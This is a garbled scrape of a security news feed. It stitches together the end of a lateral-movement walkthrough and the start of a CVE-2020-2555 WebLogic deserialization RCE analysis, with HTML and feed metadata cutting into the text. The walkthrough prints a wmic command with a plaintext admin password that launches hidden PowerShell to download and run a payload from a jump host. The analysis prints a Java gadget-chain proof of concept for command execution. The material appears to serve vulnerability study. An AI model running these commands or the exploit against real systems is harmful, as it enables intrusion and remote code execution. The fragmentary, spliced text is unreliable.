</em><em style=\"box-sizing: border-box;\"><code style=\"box-sizing: border-box;text-align: left;vertical-align: initial;border-width: 1px;border-style: solid;border-color: rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding-right: 2px;padding-left: 2px;font-size: 0.9em;font-family: var(--monospace);\">http://39.100.x.x:7799/a</code></em><em style=\"box-sizing: border-box;\"> 上的payload，复制下来并在跳板机开启WEB服务，使受害机下载并执行跳板机上的Payload，上线CS。</em></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">跳板机安装了 python 运行如下命令快速开启WEB服务。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">beacon&#62;&#160;shell&#160;python&#160;-m&#160;SimpleHTTPServer&#160;8080</pre>\n</section>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">beacon&#62;&#160;shell&#160;wmic&#160;/node:192.168.200.66/user:administrator&#160;/password:Hacker@1.&#160;process&#160;call&#160;create&#160;&#34;powershell.exe&#160;-nop&#160;-w&#160;hidden&#160;-c&#160;IEX&#160;((new-object&#160;net.webclient).downloadstring(&#39;http://192.168.200.222:8080/payload.txt&#39;))&#34;</pre>\n</section>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">成功上线。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: SimSun;\">在 windows server 2012 验证。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" mdtype=\"blockquote\" style=\"box-sizing: border-box;margin-top: 0.8em;margin-bottom: 0.8em;border-left-width: 4px;border-left-color: rgb(223, 226, 229);padding-top: 0px;padding-right: SimSun;\">PsExec是一种轻巧的telnet替代品，可让您在其他系统上执行进程，并为控制台应用程序提供完整的交互性，而无需手动安装客户端软件。</span></p>\n</blockquote>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: SimSun;\">因为换了WiFi地址所有IP发生了如下变化。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: +0000","feedId":5124,"bgimg":"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image30.png","linkMd5":"a5de06e1c74651f0c71abd1b62b90af7","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn36@2020_1/2020/09/05/07-08-48-637_5fb13cabb35310fe.webp","destWidth":639,"destHeight":571,"sourceBytes":86786,"destBytes":13870,"author":"美团SRC","articleImgCdnMap":{"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image30.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn36@2020_1/2020/09/05/07-08-48-637_5fb13cabb35310fe.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image31.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn8@2020_3/2020/09/05/07-09-23-931_df0811a47f2a7cda.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image32-963x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn22@2020_6/2020/09/05/07-09-24-162_758ce5bf956bd746.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image33.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn56@2020_6/2020/09/05/07-09-19-167_d790470d101ce825.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image34-349x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn71@2020_6/2020/09/05/07-09-15-137_b8d1a2179dd3c57f.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/0Vwn6OxH3_4AkE-253x1024.jpg":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn14@2020_1/2020/09/05/07-09-06-170_7706de0b661212dd.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image35.png":null,"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image36-338x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn58@2020_2/2020/09/05/07-09-09-380_328553afb47fff8d.webp","https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image37.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn39@ 15:08:45","updatedTime":"2020-09-05 15:08:45","title":"CVE-2020-2555：Weblogic Cohence反序列化RCE分析利用","link":"https://www.secpulse.com/?p=140207","description":"<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image1.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image1.png\" title=\"image1.png\" alt=\"image.png\"/></a></p>\n<p>在对Java Web应用程序进行研究时，不安全的反序列化漏洞已经成为了攻击者或研究人员的常见目标了。这些漏洞将导致他人在目标设备上可靠地实现远程代码执行，而且这类漏洞通常很难修复。</p>\n<p>2020年3月6日Weblogic公开了该漏洞，这是一个严重漏洞，CVSS评分为9.8，该漏洞将影响Oracle Coherence库，而这个库在Oracle WebLogic Server等流行产品中都有广泛使用。</p>\n<p>此次受影响版本：</p>\n<ul class=\" list-paddingleft-2\">\n<li>\n<p>Oracle Coherence 3.7.1.17</p>\n</li>\n<li>\n<p>Oracle Coherence 12.1.3.0.0</p>\n</li>\n<li>\n<p>Oracle Coherence 12.2.1.3.0.0</p>\n</li>\n<li>\n<p>Oracle Coherence 12.2.1.4.0.0</p>\n</li>\n</ul>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">本文目标</span></p>\n<p>1、学习T3协议、Java反序列化在网络传输时流量特征；</p>\n<p>2、理解漏洞形成的原因Gadget，学习poc构造技巧；</p>\n<p>3、为下一步利用该洞做回显准备。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image2.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image2.png\" title=\"image2.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">调试分析</span></p>\n<p>POC：https://github.com/Y4er/CVE-2020-2555</p>\n<p>JDK：1.8.131</p>\n<p>IDEA：2019.3.3</p>\n<p>Weblogic：12.2.1.3.0.0</p>\n<p>运行weblogic_t3.py通过t3协议发送序列化的payload</p>\n<p>POC去除无关行后约30行，如下：</p>\n<pre class=\"syl-page-code hljs javascript\">String&#160;cmd&#160;=&#160;&#34;calc&#34;;//定义多次转换链进行反射调用ValueExtractor[]&nbsp;valueExtractors&#160;=&#160;new&#160;ValueExtractor[]{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;new&#160;ReflectionExtractor(&#34;getMethod&#34;,&#160;new&#160;Object[]{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#34;getRuntime&#34;,&#160;new&#160;Class[0]\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}),\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;new&#160;ReflectionExtractor(&#34;invoke&#34;,&#160;new&#160;Object[]{null,&#160;new&#160;Object[0]}),\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;new&#160;ReflectionExtractor(&#34;exec&#34;,&#160;new&#160;Object[]{new&#160;String[]{&#34;cmd&#34;,&#160;&#34;/c&#34;,&#160;cmd}})\n};\n\n//初始化LimitFiler类实例\nLimitFilter&#160;limitFilter&#160;=&#160;new&#160;LimitFilter();\nlimitFilter.setTopAnchor(Runtime.class);\nBadAttributeValueExpException&#160;expException&#160;=&#160;new&#160;BadAttributeValueExpException(null);\nField&#160;m_comparator&#160;=&#160;limitFilter.getClass().getDeclaredField(&#34;m_comparator&#34;);\nm_comparator.setAccessible(true);\nm_comparator.set(limitFilter,&#160;new&#160;ChainedExtractor(valueExtractors));\nField&#160;m_oAnchorTop&#160;=&#160;limitFilter.getClass().getDeclaredField(&#34;m_oAnchorTop&#34;);\nm_oAnchorTop.setAccessible(true);\nm_oAnchorTop.set(limitFilter,&#160;Runtime.class);\n\n//将limitFilter放入BadAttributeValueExpException的val属性中\nField&#160;val&#160;=&#160;expException.getClass().getDeclaredField(&#34;val&#34;);\nval.setAccessible(true);\nval.set(expException,&#160;limitFilter);\n\n//生成序列化payload\nObjectOutputStream&#160;objectOutputStream&#160;=&#160;new&#160;ObjectOutputStream(null);\nobjectOutputStream.writeObject(expException);\nobjectOutputStream.close();</pre>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">1、关于T3协议部分</span></p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image3.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image3.png\" title=\"image3.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>发包后，用wireshark抓包，发送的第一个包为T3协议头，T3协议头为t3 12.2.1\\nAS:255\\nHL:19”，第一行为&#34;t3&#34;加weblogic客户端的版本号。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image4.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image4.png\" title=\"image4.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>Weblogic服务器的返回数据为&#34;HELO:12.2.1.3.false\\nAS:2048\\nHL:19&#34;，第一行为“HELO:”加Weblogic服务器的版本号。Weblogic客户端与服务器发送的数据均以“\\n\\n”结尾。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image5.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image5.png\" title=\"image5.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>Weblogic_t3.py向Weblogic发送了T3协议头的数据包，然后读取序列化数据进行发送。</p>\n<p>在数据中查找JAVA序列化魔术头部ac ed 00 05 可以发现出现多处，观察到T3协议使用jre的原生ObjectOutputStream。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image6.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image6.png\" title=\"image6.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>exp被切割为多段传输，以fe 01 00 00 隔开。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image7.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image7.png\" title=\"image7.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">2、T3协议反序列化执行</span></p>\n<p>将断点设在T3入口，InboundMsgAbbrev#readObject( )；</p>\n<p>第47行ServerChannelInputStream(其父类为ObjectInputStream)的构造方法，将MsgAbbrevInputStream的in实例转为ObjectInputStream类型。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image8.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image8.png\" title=\"image8.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>上图第47行末尾是关键，调用ObjectInputStream#readObject( )，来到80行，super(in)将执行Object类初始化。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image9.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image9.png\" title=\"image9.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>至此，成功进入jre原生反序列化ObjectInputStream.readObject( )。接下来将进入BadAttributeValueExpException#readObject( )，(恶意变量被取出，结合POC第25行理解)。在ysoserial的CommonsCollections5的gadget最外层的入口即为该类，因为security manager为null的情况下（下图第78行）将进入if分支，调用LimitFilter #tostring( )。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image10.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image10.png\" title=\"image10.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">3、coherence.jar反序列化执行</span></p>\n<p>恶意数据传入weblogic代码部分，</p>\n<p>coherence.jar!com/tangosol/util/filter/LimitFilter类。</p>\n<p>注意力集中</p>\n<p>coherence.jar!com/tangosol/util/filter/LimitFilter #tostring。</p>\n<p>那么接下来将获取到该类的m_comparator成员属性(恶意变量被取出，结合POC第17行理解)，并调用其extract函数，因为limitfilter实例由我们poc中提供，因此this.m_oAnchorTop可控(恶意变量被取出，结合POC第20行理解)。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image11.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image11.png\" title=\"image11.png\" alt=\"image.png\"/></a></p>\n<p>chained从字面意思上来理解就是其肯定存在一个为数组类型的成员属性保存一组Extractor来依次调用其extract函数，并将调用结果返回(注意理解第34行oTarget迭代)。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image12.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image12.png\" title=\"image12.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>那么在poc中chainedExtractor中存放的为coherence.jar中的com/tangosol/util/extractor/ReflectionExtractor类的实例，其extract函数中也正是实现了任意方法的调用，注意到59行传入2个参数(第一个参数是方法属于的对象，第二个可变参数是该方法的参数)，其中方法名this.m_sMethod和对应的参数值this.m_aoParam都是可控的(恶意变量被取出，结合POC第4-8行理解)。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image13.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image13.png\" title=\"image13.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>invoke表示，调用包装在当前Method对象中的方法。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image14.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image14.png\" title=\"image14.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>第一回，反射调用Runtime类getmethod方法(结合POC第20行理解)，返回值为 Method类型的getruntime方法(见上图第59行)</p>\n<p>第二回，我们希望反射调用invoke函数，getruntime方法已准备好，故可执行invoke得到Runtime类的实例，这就是为什么构造this.m_sMethod=invoke(即为poc第7行invoke)。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image15.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image15.png\" title=\"image15.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p>第三回，经过前面2次积累，有了Runtime实例，因此可调用exec方法执行命令。构造this.m_sMethod=exec(即为poc第8行exec)，实验结束。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image16.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image16.png\" title=\"image16.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image17.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image17.png\" title=\"image17.png\" alt=\"image.png\"/></a></p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px;margin-bottom: 16px;padding: 0px;border: 0px\"><br/></p>\n<p><span style=\"margin: 0px;padding: 0px;border: 0px;font-weight: 700\">4、chainedExtractor链式调用反射</span></p>\n<p>（1）补充oTarget的3次变化(class-&#62;method-&#62;instance)</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image18.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image18.png\" title=\"image18.png\" alt=\"image.png\"/></a></p>\n<p>（2）补充method变量的3次变化(class-&#62;method-&#62;instance)</p>\n<p class=\"pgc-img-caption\" style=\"margin-top: 16px; margin-bottom: 16px; padding: 0px; border: 0px; text-align: center;\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image19.png\" class=\"zoomImg\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image19.png\" title=\"image19.png\" alt=\"image.png\"/></a></p>\n<p><span style=\"margin: 0px;padding: 0px;border:
